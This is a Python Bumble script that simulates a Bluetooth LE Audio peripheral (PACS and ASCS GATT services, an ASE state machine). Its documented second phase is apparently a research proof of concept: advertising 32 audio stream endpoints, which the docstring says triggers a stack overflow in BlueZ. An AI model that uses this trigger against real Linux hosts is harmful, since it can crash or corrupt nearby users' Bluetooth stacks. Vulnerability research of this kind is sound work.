"""LE Audio Peripheral Simulator — Bumble GATT Server

Phase 1: Normal peripheral simulation.
    --ase 2: 2 ASEs, normal operation.
Phase 2: Vulnerability trigger.
    --ase 32: 32 ASEs, triggers stack overflow in BlueZ append_setup/append_stream.

Usage:
    sudo /mnt/d/Projects/pyBumbleMesh/.venv/bin/python ble_audio_peripheral.py hci-socket:0 [--ase N]
"""
import asyncio
import argparse
import logging
import re
import struct
import sys

from bumble.device import Device, Connection
from bumble.transport import open_transport
from bumble.core import AdvertisingData, UUID
from bumble.gatt import Service, Characteristic, CharacteristicValue
from bumble.att import Attribute

# ── Logging ────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s'
)
logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════════════════════════
# LE Audio UUIDs (Bluetooth Assigned Numbers)
# ═══════════════════════════════════════════════════════════════════════════
UUID_PACS       = UUID('00001850-0000-1000-8000-00805F9B34FB')
UUID_ASCS       = UUID('0000184E-0000-1000-8000-00805F9B34FB')
UUID_SINK_PAC   = UUID('00002BC9-0000-1000-8000-00805F9B34FB')
UUID_SINK_LOC   = UUID('00002BCA-0000-1000-8000-00805F9B34FB')
UUID_SOURCE_PAC = UUID('00002BCB-0000-1000-8000-00805F9B34FB')
UUID_SOURCE_LOC = UUID('00002BCC-0000-1000-8000-00805F9B34FB')
UUID_AVAIL_CTX  = UUID('00002BCD-0000-1000-8000-00805F9B34FB')
UUID_SUPP_CTX   = UUID('00002BCE-0000-1000-8000-00805F9B34FB')
UUID_ASE_SINK   = UUID('00002BC4-0000-1000-8000-00805F9B34FB')
UUID_ASE_SOURCE = UUID('00002BC5-0000-1000-8000-00805F9B34FB')
UUID_ASE_CP     = UUID('00002BC6-0000-1000-8000-00805F9B34FB')

# ═══════════════════════════════════════════════════════════════════════════
# ASE State Machine
# ═══════════════════════════════════════════════════════════════════════════

class ASEState:
    IDLE              = 0x00
    CODEC_CONFIGURED  = 0x01
    QOS_CONFIGURED    = 0x02
    ENABLING          = 0x03
    STREAMING         = 0x04

    _NAMES = {
        0x00: 'IDLE',
        0x01: 'CODEC_CONFIGURED',
        0x02: 'QOS_CONFIGURED',
        0x03: 'ENABLING',
        0x04: 'STREAMING',
    }

    @classmethod
    def name(cls, state: int) -> str:
        return cls._NAMES.get(state, f'UNKNOWN({state})')


# ASE Control Point opcodes
CP_CODEC_CONFIG = 0x01
CP_QOS_CONFIG  = 0x02
CP_ENABLE      = 0x03
CP_DISABLE     = 0x05
CP_RELEASE     = 0x06


class ASE:
    """A single Audio Stream Endpoint."""
    def __init__(self, index: int, direction: int = 0):
        self.index = index
        self.direction = direction  # 0=Sink, 1=Source
        self.state = ASEState.IDLE
        self.bis = 0
        # Codec Config fields
        self.codec_id = 0x06   # LC3
        self.framing = 0x00    # Unframed
        self.preferred_phy = 0x02  # LE 2M
        # QoS Config fields
        self.sdu = 40
        self.rtn = 2
        self.latency = 10
        self.presentation_delay = 40000
        self.phy = 0x02
        self.max_sdu = 40
        self.max_latency = 10

    def build_state_value(self) -> bytes:
        """Build ASE characteristic value per ASCS spec Table 5.2."""
        octet0 = self.index & 0x3F  # ASE_ID in bits 0-5
        data = bytes([octet0, self.state])

        if self.state >= ASEState.CODEC_CONFIGURED:
            # Codec Config: framing, phy, codec_id, codec_specific
            data += struct.pack('<B B B B B',
                self.framing,
                self.preferred_phy,
                0x00,           # rfu
                self.codec_id,
                0x00,           # codec specific caps length = 0
            )

        if self.state >= ASEState.QOS_CONFIGURED:
            # QoS Config: CIG/CIS params
            data += struct.pack('<BBB B B B B I H H B H I I',
                0x01,           # CIG_ID
                0x01,           # CIS_ID
                0x00,           # SDU Interval (3 bytes)
                0x00,
                0x00,
                self.framing,
                self.phy,
                0x00,           # rfu
                self.sdu,       # Max SDU
                self.rtn,       # Retransmission Number
                self.latency,   # Max Transport Latency
                self.presentation_delay,
                self.max_sdu,   # Preferred Max SDU
                self.max_latency,
            )

        if self.state >= ASEState.ENABLING:
            # Metadata length = 0
            data += b'\x00'

        return data


# ── ASE State Machine Callbacks ────────────────────────────────────────────

# Global ASE registry — populated during service creation
_ase_registry: list[ASE] = []


def _extract_bis(value: bytes) -> int:
    """Extract BIS number from stream path like b'/org/bluez/.../bis1'."""
    match = re.search(rb'/bis(\d+)', value)
    if match:
        return int(match.group(1))
    return 0


def _handle_ase_cp_write(connection, value: bytes):
    """Handle ASE Control Point Write from BlueZ (client).

    ASCS Control Point opcodes:
        0x01 — Codec Config
        0x02 — QoS Config
        0x03 — Enable
        0x05 — Disable
        0x06 — Release
    """
    if len(value) < 2:
        logger.error("ASE CP write too short: %d bytes", len(value))
        return

    opcode = value[0]
    ase_id = value[1] & 0x3F

    ase = next((a for a in _ase_registry if a.index == ase_id), None)
    if ase is None:
        logger.error("ASE %d not found (registry has %d entries)", ase_id, len(_ase_registry))
        return

    old_state = ASEState.name(ase.state)
    handled = False

    if opcode == CP_CODEC_CONFIG and ase.state == ASEState.IDLE:
        ase.framing = value[2] if len(value) > 2 else 0
        ase.preferred_phy = value[3] if len(value) > 3 else 0x02
        ase.codec_id = value[5] if len(value) > 5 else 0x06
        ase.bis = _extract_bis(value)
        ase.state = ASEState.CODEC_CONFIGURED
        handled = True

    elif opcode == CP_QOS_CONFIG and ase.state == ASEState.CODEC_CONFIGURED:
        if len(value) >= 18:
            ase.sdu = struct.unpack_from('<I', value, 2)[0]
            ase.rtn = struct.unpack_from('<H', value, 6)[0]
            ase.latency = struct.unpack_from('<H', value, 8)[0]
            ase.phy = value[10]
        ase.state = ASEState.QOS_CONFIGURED
        handled = True

    elif opcode == CP_ENABLE and ase.state == ASEState.QOS_CONFIGURED:
        ase.state = ASEState.ENABLING
        handled = True

    elif opcode == CP_DISABLE:
        ase.state = ASEState.QOS_CONFIGURED
        handled = True

    elif opcode == CP_RELEASE:
        ase.state = ASEState.IDLE
        handled = True

    if handled:
        logger.info(
            "ASE %d: %s → %s (op=0x%02x, bis=%d)",
            ase_id, old_state, ASEState.name(ase.state), opcode, ase.bis
        )
    else:
        logger.warning(
            "ASE %d: REJECTED op=0x%02x, state=%s (invalid transition)",
            ase_id, opcode, old_state
        )


# ── PACS: Published Audio Capabilities Service ─────────────────────────────
def build_sink_pac(num_ase: int) -> bytes:
    """Build Sink PAC characteristic value for N ASEs.

    BlueZ bt_pac struct: codec{id(1)+cid(2)+vid(2)} + cc_len(1) + num_ase(1) = 7 bytes
    followed by LTV caps and metadata.
    """
    codec_id = 0x06  # LC3
    lc3_caps = bytes([
        0x02, 0x01, 0x0F, 0x00,    # L=2, T=1 (SamplingFreq), V=0x000F
        0x02, 0x02, 0x03, 0x00,    # L=2, T=2 (FrameDuration), V=0x0003
        0x02, 0x03, 0x03, 0x00,    # L=2, T=3 (AudioChannels), V=0x0003
        0x05, 0x04, 0x1E, 0x00, 0x78, 0x00,  # L=5, T=4 (FrameLen), min30 max120
        0x02, 0x05, 0x01, 0x00,    # L=2, T=5 (MaxFramesPerSDU), V=1
    ])
    pac_hdr = struct.pack('<B B H H B B',
        1,                  # num_pac
        codec_id,           # codec.id
        0x0000,             # codec.cid (unused for standard codecs)
        0x0000,             # codec.vid (unused for standard codecs)
        len(lc3_caps),      # cc_len
        num_ase             # num_ase
    )
    return pac_hdr + lc3_caps + b'\x00'  # meta_len = 0


def create_pacs_service(num_ase: int) -> Service:
    """Create the PACS (Published Audio Capabilities Service)."""
    chars = []

    # Sink PAC
    chars.append(Characteristic(
        UUID_SINK_PAC,
        Characteristic.READ | Characteristic.NOTIFY,
        Attribute.READABLE,
        CharacteristicValue(
            read=lambda conn: build_sink_pac(num_ase)
        ),
    ))

    # Sink Audio Locations — Front Left (0x00000001)
    chars.append(Characteristic(
        UUID_SINK_LOC,
        Characteristic.READ,
        Attribute.READABLE,
        CharacteristicValue(
            read=lambda conn: struct.pack('<I', 0x00000001)
        ),
    ))

    # Source PAC — empty
    chars.append(Characteristic(
        UUID_SOURCE_PAC,
        Characteristic.READ,
        Attribute.READABLE,
        CharacteristicValue(read=lambda conn: b''),
    ))

    # Source Audio Locations — 0
    chars.append(Characteristic(
        UUID_SOURCE_LOC,
        Characteristic.READ,
        Attribute.READABLE,
        CharacteristicValue(
            read=lambda conn: struct.pack('<I', 0x00000000)
        ),
    ))

    # Context characteristics
    ctx_zero = CharacteristicValue(
        read=lambda conn: struct.pack('<H', 0x0000)
    )
    chars.append(Characteristic(
        UUID_AVAIL_CTX,
        Characteristic.READ | Characteristic.NOTIFY,
        Attribute.READABLE,
        ctx_zero,
    ))
    chars.append(Characteristic(
        UUID_SUPP_CTX,
        Characteristic.READ | Characteristic.NOTIFY,
        Attribute.READABLE,
        ctx_zero,
    ))

    return Service(UUID_PACS, chars, primary=True)


# ── ASCS: Audio Stream Control Service ─────────────────────────────────────
def create_ascs_service(num_ase: int) -> Service:
    """Create the ASCS (Audio Stream Control Service).

    Contains: ASE Control Point + N ASE characteristics.
    """
    global _ase_registry
    _ase_registry.clear()

    chars = []

    # ASE Control Point — Write from BlueZ, Notify from us
    chars.append(Characteristic(
        UUID_ASE_CP,
        Characteristic.WRITE | Characteristic.NOTIFY,
        Attribute.WRITEABLE,
        CharacteristicValue(
            write=lambda conn, val: _handle_ase_cp_write(conn, val)
        ),
    ))

    # ASE characteristics — one per ASE, all Sink (0x2BC4)
    for i in range(num_ase):
        ase = ASE(index=i, direction=0)
        _ase_registry.append(ase)

        # Capture `ase` in closure
        def make_read(ase_ref):
            return lambda conn: ase_ref.build_state_value()

        chars.append(Characteristic(
            UUID_ASE_SINK,
            Characteristic.READ | Characteristic.NOTIFY,
            Attribute.READABLE,
            CharacteristicValue(read=make_read(ase)),
        ))

        logger.debug("Registered ASE %d (Sink)", i)

    return Service(UUID_ASCS, chars, primary=True)


# ── Main ───────────────────────────────────────────────────────────────────
async def main():
    parser = argparse.ArgumentParser(
        description='LE Audio Peripheral Simulator'
    )
    parser.add_argument(
        'transport', nargs='?', default='hci-socket:0',
        help='HCI transport (e.g., hci-socket:0, hci-socket:2)'
    )
    parser.add_argument(
        '--ase', type=int, default=2,
        help='Number of ASEs (default: 2)'
    )
    args = parser.parse_args()

    num_ase = args.ase
    logger.info("=" * 50)
    logger.info("LE Audio Peripheral Simulator")
    logger.info("  ASE count: %d", num_ase)
    logger.info("  Transport: %s", args.transport)
    logger.info("=" * 50)

    async with await open_transport(args.transport) as (hci_source, hci_sink):
        device = Device.with_hci(
            'LE-Audio-Periph', '00:11:22:33:44:55',
            hci_source, hci_sink
        )
        await device.power_on()
        logger.info("HCI device powered on")

        # ── Register GATT Services ───────────────────────────────────────
        pacs = create_pacs_service(num_ase)
        device.add_service(pacs)
        logger.info("PACS service registered (%d ASEs advertised)", num_ase)

        ascs = create_ascs_service(num_ase)
        device.add_service(ascs)
        logger.info("ASCS service registered (%d ASE characteristics)", num_ase)

        # ── Connection logging ───────────────────────────────────────────
        def on_connection(connection):
            logger.info("BLE Connected: %s", connection.peer_address)

        def on_disconnection(reason):
            logger.info("BLE Disconnected (reason=%s)", reason)

        device.on('connection', on_connection)
        device.on('disconnection', on_disconnection)

        # ── Start Advertising ────────────────────────────────────────────
        from bumble.data_types import ServiceData16BitUUID
        # 手拼 BLE 广告数据:
        # AD Flag: 0x02, 0x01, 0x06
        # Short Name: 0x0E, 0x09, 'LE-Audio-Test'
        # 16-bit Service UUIDs: 0x03, 0x02/0x03, 0x50, 0x18  (PACS=0x1850)
        ad_raw = bytes([
            0x02, 0x01, 0x06,  # Flags: LE General Discoverable
            0x0E, 0x09,         # Complete Local Name (len=14)
        ]) + b'LE-Audio-Test' + bytes([
            0x03, 0x03, 0x50, 0x18,  # Complete List of 16-bit UUIDs: 0x1850 (PACS)
        ])
        await device.start_advertising(
            advertising_data=ad_raw,
            own_address_type=0x00,  # PUBLIC → DC:A6:32:DC:4A:A4
        )


        logger.info(
            "Advertising as 'LE-Audio-Test' with PACS UUID."
            " Press Ctrl+C to stop."
        )

        # Block forever (or until Ctrl+C)
        await asyncio.Event().wait()


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[*] Shutting down.")
